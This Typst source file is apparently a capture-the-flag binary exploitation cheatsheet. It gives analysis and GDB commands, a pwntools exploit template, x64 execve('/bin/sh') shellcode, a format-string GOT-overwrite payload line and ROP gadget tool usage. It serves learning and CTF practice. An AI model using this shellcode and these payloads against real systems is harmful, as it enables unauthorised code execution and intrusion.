#import "../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Pwn Cheatsheet",
    description: "A quick reference for binary exploitation commands, tools, and techniques.",
    date: "2025-12-26",
    order: 10,
  ),
)<frontmatter>

= Pwn Cheatsheet

== Initial Analysis

=== File Information
```bash
file ./challenge         # Basic file info (arch, linking, stripped)
checksec --file ./challenge # Check for RELRO, Canary, NX, PIE
strings ./challenge      # Look for hardcoded strings/flags
ldd ./challenge          # Check library dependencies
nm -D ./challenge        # List dynamic symbols
```

=== Identifying Vulnerabilities
- `gets()`, `scanf("%s")`, `strcpy()` -> *Buffer Overflows*
- `printf(buf)` -> *Format String*
- `malloc()`, `free()` -> *Heap Vulnerabilities*

== Debugging (GDB + pwndbg/gef)

=== Basic Commands
- `r [args]` : Run program
- `b *0x401234` : Set breakpoint at address
- `b main` : Set breakpoint at function
- `c` : Continue
- `ni` / `si` : Next Instruction / Step Instruction
- `p/x $rax` : Print register in hex
- `x/10gx $rsp` : Examine 10 giant (64-bit) hex words at RSP
- `vmmap` : Show memory mappings (NX/PIE check)
- `telescope` : Recursive pointer dereferencing
- `stack` : View stack content

== Pwntools Template

```python
from pwn import *

context.binary = elf = ELF('./challenge')
libc = ELF('./libc.so.6') # if provided

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            b *main
            continue
        ''')
    elif args.REMOTE:
        return remote('addr', 1337)
    else:
        return process(elf.path)

io = start()

# io.sendlineafter(b'> ', b'A'*40 + p64(elf.sym.win))
# io.interactive()
```

== Common Shellcode (x64)

```nasm
; execve("/bin/sh", NULL, NULL)
xor rsi, rsi
xor rdx, rdx
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
mov al, 59
syscall
```

== Format Strings (x64)

- `%p` : Read from stack
- `%{n}$p` : Read n-th argument
- `%n` : Write number of bytes printed so far to address
- `%hn` : Write 2 bytes
- `%hhn` : Write 1 byte

```python
# pwntools auto-exploit
fmt = fmtstr_payload(offset, {elf.got.printf: elf.sym.win})
```

== Useful Tools
- *ROPgadget*: `ROPgadget --binary ./challenge --only "pop|ret"`
- *one_gadget*: `one_gadget ./libc.so.6`
- *seccomp-tools*: `seccomp-tools dump ./challenge`
- *patchelf*: `patchelf --set-interpreter ./ld.so --set-rpath . ./challenge`
